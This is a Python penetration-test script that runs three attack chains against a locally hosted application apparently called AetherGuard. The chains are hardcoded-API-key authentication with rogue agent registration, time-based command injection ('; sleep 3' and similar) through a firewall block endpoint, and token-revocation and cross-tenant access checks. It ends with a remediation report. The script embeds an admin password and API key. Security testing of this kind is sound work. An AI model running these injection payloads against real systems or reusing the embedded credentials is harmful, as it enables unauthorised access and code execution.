#!/usr/bin/env python3
"""
AetherGuard Security Test - Phase 5: Complete Attack Chain Testing
Executes full JWT forgery -> RCE attack chain
"""

import requests
import json
import time
import sys
import base64
import hmac
import hashlib
from datetime import datetime, timedelta

# Configuration
BACKEND_URL = "http://localhost:3005"
FRONTEND_URL = "http://localhost:8080"

# KNOWN HARDCODED API KEY FROM SOURCE CODE
HARDCODED_API_KEY = "fe589f4f38dde88b31ad18c3ee0dc0513e51a6603a110a120fcb649a1ac11904"


class AttackChainResult:
    def __init__(self, name):
        self.name = name
        self.steps = []
        self.success = False
        self.final_impact = None

    def add_step(self, step_num, description, success, details):
        self.steps.append({
            "step": step_num,
            "description": description,
            "success": success,
            "details": details
        })

    def to_dict(self):
        return {
            "name": self.name,
            "success": self.success,
            "steps": self.steps,
            "final_impact": self.final_impact
        }


def attack_chain_1_jwt_forgery_to_rce():
    """
    Attack Chain 1: JWT Forgery -> Agent Registration -> Command Injection -> RCE

    This chain exploits:
    1. Hardcoded API key in source code (agent.ts:494)
    2. Command injection in firewall controller (enhanced-firewall-controller.ts)
    """
    result = AttackChainResult("JWT Forgery -> RCE Attack Chain")

    print("\n" + "=" * 70)
    print("ATTACK CHAIN 1: JWT Forgery -> RCE")
    print("=" * 70)

    # Step 1: Use hardcoded API key to authenticate
    print("\n[STEP 1] Attempting authentication with hardcoded API key...")
    try:
        response = requests.get(
            f"{BACKEND_URL}/api/agents",
            headers={"X-API-Key": HARDCODED_API_KEY},
            timeout=10
        )

        if response.status_code == 200:
            result.add_step(1, "Authenticate with hardcoded API key", True,
                          f"API key accepted, got agent list")
            print("    [SUCCESS] Hardcoded API key is valid!")
            print(f"    Got {len(response.json()) if isinstance(response.json(), list) else 'data'} from /api/agents")
        else:
            result.add_step(1, "Authenticate with hardcoded API key", False,
                          f"API key rejected: {response.status_code}")
            print(f"    [FAILED] API key rejected: {response.status_code}")
            return result

    except Exception as e:
        result.add_step(1, "Authenticate with hardcoded API key", False, str(e))
        print(f"    [ERROR] {e}")
        return result

    # Step 2: Register malicious agent
    print("\n[STEP 2] Registering malicious agent...")
    malicious_agent_id = f"attacker-agent-{int(time.time())}"

    try:
        response = requests.post(
            f"{BACKEND_URL}/api/agents/register",
            headers={"X-API-Key": HARDCODED_API_KEY},
            json={
                "agentId": malicious_agent_id,
                "hostname": "attacker-controlled",
                "platform": "linux",
                "version": "1.0.0-evil",
                "capabilities": ["firewall", "traffic", "logs"]
            },
            timeout=10
        )

        if response.status_code in [200, 201]:
            result.add_step(2, "Register malicious agent", True,
                          f"Agent registered: {malicious_agent_id}")
            print(f"    [SUCCESS] Agent registered: {malicious_agent_id}")
        else:
            result.add_step(2, "Register malicious agent", False,
                          f"Registration failed: {response.status_code}")
            print(f"    [FAILED] Registration failed: {response.status_code}")
            print(f"    Response: {response.text[:200]}")
            # Continue anyway - agent might already exist

    except Exception as e:
        result.add_step(2, "Register malicious agent", False, str(e))
        print(f"    [ERROR] {e}")

    # Step 3: Get legitimate admin token for comparison
    print("\n[STEP 3] Getting admin token for additional access...")
    admin_token = None

    try:
        response = requests.post(
            f"{BACKEND_URL}/api/auth/login",
            json={"email": "admin@aetherguard.local", "password": "eIMFrx5bNPpgYaweouM1"},
            timeout=10
        )

        if response.status_code == 200:
            admin_token = response.json().get("accessToken")
            result.add_step(3, "Get admin token", True, "Got valid admin token")
            print("    [SUCCESS] Got admin token")
        else:
            result.add_step(3, "Get admin token", False, f"Login failed: {response.status_code}")
            print(f"    [FAILED] Login failed: {response.status_code}")

    except Exception as e:
        result.add_step(3, "Get admin token", False, str(e))
        print(f"    [ERROR] {e}")

    # Step 4: Attempt command injection via firewall endpoint
    print("\n[STEP 4] Testing command injection via firewall endpoint...")

    # Time-based injection payload
    injection_payloads = [
        ("8.8.8.8; sleep 3", "time-based"),
        ("8.8.8.8 && sleep 3", "time-based AND"),
        ("8.8.8.8 | sleep 3", "time-based pipe"),
    ]

    auth_headers = {"Authorization": f"Bearer {admin_token}"} if admin_token else {"X-API-Key": HARDCODED_API_KEY}

    for payload, desc in injection_payloads:
        print(f"\n    Testing: {desc} injection")
        start_time = time.time()

        try:
            response = requests.post(
                f"{BACKEND_URL}/api/agents/{malicious_agent_id}/block",
                headers={**auth_headers, "Content-Type": "application/json"},
                json={"ip": payload},
                timeout=15
            )

            elapsed = time.time() - start_time

            if elapsed >= 3:
                result.add_step(4, f"Command injection ({desc})", True,
                              f"INJECTION CONFIRMED - Time elapsed: {elapsed:.2f}s")
                print(f"    [VULNERABLE] Time-based injection confirmed!")
                print(f"    Elapsed time: {elapsed:.2f}s (expected >= 3s)")
                result.success = True
                result.final_impact = "REMOTE CODE EXECUTION - Full system compromise possible"
                break
            else:
                print(f"    No injection - Time: {elapsed:.2f}s, Status: {response.status_code}")

        except requests.exceptions.Timeout:
            result.add_step(4, f"Command injection ({desc})", True,
                          "INJECTION CONFIRMED - Request timeout")
            print(f"    [VULNERABLE] Request timeout - injection likely!")
            result.success = True
            result.final_impact = "REMOTE CODE EXECUTION - Full system compromise possible"
            break
        except Exception as e:
            print(f"    [ERROR] {e}")

    # Step 5: Demonstrate impact (simulated - no actual malicious commands)
    if result.success:
        print("\n[STEP 5] Demonstrating attack impact...")
        result.add_step(5, "Impact demonstration", True, """
        With RCE achieved, attacker could:
        - Read sensitive files (/etc/passwd, /etc/shadow, .env files)
        - Establish persistence (cron jobs, systemd services)
        - Pivot to other systems in the network
        - Install rootkits or backdoors
        - Exfiltrate data
        - Disrupt services
        """)
        print("    Attack chain complete - Full system compromise achievable")

    return result


def attack_chain_2_token_theft_to_persistence():
    """
    Attack Chain 2: Token Theft -> Session Hijack -> Persistent Access
    """
    result = AttackChainResult("Token Theft -> Persistence Attack Chain")

    print("\n" + "=" * 70)
    print("ATTACK CHAIN 2: Token Theft -> Persistent Access")
    print("=" * 70)

    # Step 1: Get valid token
    print("\n[STEP 1] Obtaining valid authentication token...")
    try:
        response = requests.post(
            f"{BACKEND_URL}/api/auth/login",
            json={"email": "admin@aetherguard.local", "password": "eIMFrx5bNPpgYaweouM1"},
            timeout=10
        )

        if response.status_code == 200:
            token = response.json().get("accessToken")
            refresh_token = response.json().get("refreshToken")

            result.add_step(1, "Obtain auth token", True, "Got access and refresh tokens")
            print("    [SUCCESS] Obtained tokens")
        else:
            result.add_step(1, "Obtain auth token", False, f"Login failed: {response.status_code}")
            return result

    except Exception as e:
        result.add_step(1, "Obtain auth token", False, str(e))
        return result

    # Step 2: Decode token to check expiration
    print("\n[STEP 2] Analyzing token structure...")
    try:
        parts = token.split('.')
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))

        result.add_step(2, "Analyze token", True, f"Token payload: {json.dumps(payload, indent=2)}")
        print(f"    Token payload: {json.dumps(payload, indent=4)}")

        if 'exp' in payload:
            exp_time = datetime.fromtimestamp(payload['exp'])
            print(f"    Token expires: {exp_time}")

    except Exception as e:
        result.add_step(2, "Analyze token", False, str(e))

    # Step 3: Test token revocation
    print("\n[STEP 3] Testing token revocation...")
    try:
        # Logout
        logout_response = requests.post(
            f"{BACKEND_URL}/api/auth/logout",
            headers={"Authorization": f"Bearer {token}"},
            timeout=10
        )
        print(f"    Logout response: {logout_response.status_code}")

        # Try to use token after logout
        test_response = requests.get(
            f"{BACKEND_URL}/api/agents",
            headers={"Authorization": f"Bearer {token}"},
            timeout=10
        )

        if test_response.status_code == 200:
            result.add_step(3, "Test token revocation", False,
                          "TOKEN STILL VALID AFTER LOGOUT - VULNERABILITY!")
            print("    [VULNERABLE] Token still works after logout!")
            result.success = True
            result.final_impact = "Session hijacking possible even after user logout"
        else:
            result.add_step(3, "Test token revocation", True,
                          f"Token properly revoked: {test_response.status_code}")
            print(f"    [SECURE] Token revoked: {test_response.status_code}")

    except Exception as e:
        result.add_step(3, "Test token revocation", False, str(e))

    return result


def attack_chain_3_cross_tenant_data_access():
    """
    Attack Chain 3: Cross-Tenant Data Access
    """
    result = AttackChainResult("Cross-Tenant Data Access Attack Chain")

    print("\n" + "=" * 70)
    print("ATTACK CHAIN 3: Cross-Tenant Data Access")
    print("=" * 70)

    # Step 1: Login as admin
    print("\n[STEP 1] Authenticating as admin...")
    try:
        response = requests.post(
            f"{BACKEND_URL}/api/auth/login",
            json={"email": "admin@aetherguard.local", "password": "eIMFrx5bNPpgYaweouM1"},
            timeout=10
        )

        if response.status_code == 200:
            token = response.json().get("accessToken")
            result.add_step(1, "Authenticate", True, "Got admin token")
            print("    [SUCCESS] Authenticated")
        else:
            result.add_step(1, "Authenticate", False, str(response.status_code))
            return result

    except Exception as e:
        result.add_step(1, "Authenticate", False, str(e))
        return result

    # Step 2: Try to access different tenant's data
    print("\n[STEP 2] Attempting cross-tenant access...")

    tenant_ids = ["victim-tenant", "other-tenant", "tenant-123", "production"]

    for tenant_id in tenant_ids:
        try:
            response = requests.get(
                f"{BACKEND_URL}/api/agents?tenantId={tenant_id}",
                headers={"Authorization": f"Bearer {token}"},
                timeout=10
            )

            if response.status_code == 200:
                data = response.json()
                result.add_step(2, f"Access tenant {tenant_id}", True,
                              f"Got data: {len(data) if isinstance(data, list) else 'data'}")
                print(f"    [SUCCESS] Got data from tenant {tenant_id}")
                result.success = True
            else:
                print(f"    Tenant {tenant_id}: {response.status_code}")

        except Exception as e:
            print(f"    [ERROR] {e}")

    if result.success:
        result.final_impact = "Cross-tenant data access possible - Data breach risk"

    return result


def generate_final_report(results):
    """Generate comprehensive attack chain report"""

    report = {
        "title": "AetherGuard Security Assessment - Attack Chain Report",
        "timestamp": datetime.now().isoformat(),
        "summary": {
            "total_chains": len(results),
            "successful_chains": sum(1 for r in results if r.success),
            "critical_vulnerabilities": []
        },
        "attack_chains": [r.to_dict() for r in results],
        "recommendations": []
    }

    # Add recommendations based on findings
    for result in results:
        if result.success:
            if "RCE" in str(result.final_impact):
                report["summary"]["critical_vulnerabilities"].append({
                    "chain": result.name,
                    "impact": result.final_impact,
                    "recommendation": "Remove hardcoded API keys, implement input sanitization for firewall commands"
                })
            elif "hijack" in str(result.final_impact).lower():
                report["summary"]["critical_vulnerabilities"].append({
                    "chain": result.name,
                    "impact": result.final_impact,
                    "recommendation": "Implement proper token blacklisting with Redis fail-secure"
                })
            elif "tenant" in str(result.final_impact).lower():
                report["summary"]["critical_vulnerabilities"].append({
                    "chain": result.name,
                    "impact": result.final_impact,
                    "recommendation": "Enforce tenant isolation at database query level"
                })

    return report


def run_all_attack_chains():
    """Execute all attack chains"""
    print("=" * 70)
    print("AetherGuard Security Test - Phase 5: Attack Chain Testing")
    print("=" * 70)

    attack_chains = [
        attack_chain_1_jwt_forgery_to_rce,
        attack_chain_2_token_theft_to_persistence,
        attack_chain_3_cross_tenant_data_access,
    ]

    results = []

    for chain_func in attack_chains:
        try:
            result = chain_func()
            results.append(result)
        except Exception as e:
            print(f"\n[ERROR] Attack chain failed: {e}")

    # Generate final report
    report = generate_final_report(results)

    print("\n" + "=" * 70)
    print("ATTACK CHAIN SUMMARY")
    print("=" * 70)

    for result in results:
        status = "[SUCCESS]" if result.success else "[BLOCKED]"
        print(f"\n{status} {result.name}")
        if result.final_impact:
            print(f"    Impact: {result.final_impact}")

    print("\n" + "=" * 70)
    print(f"Total chains: {len(results)}")
    print(f"Successful attacks: {sum(1 for r in results if r.success)}")
    print("=" * 70)

    # Save report
    with open("reports/phase5_attack_chain_results.json", "w") as f:
        json.dump(report, f, indent=2)

    print(f"\nReport saved to: security-tests/reports/phase5_attack_chain_results.json")

    return results


if __name__ == "__main__":
    results = run_all_attack_chains()
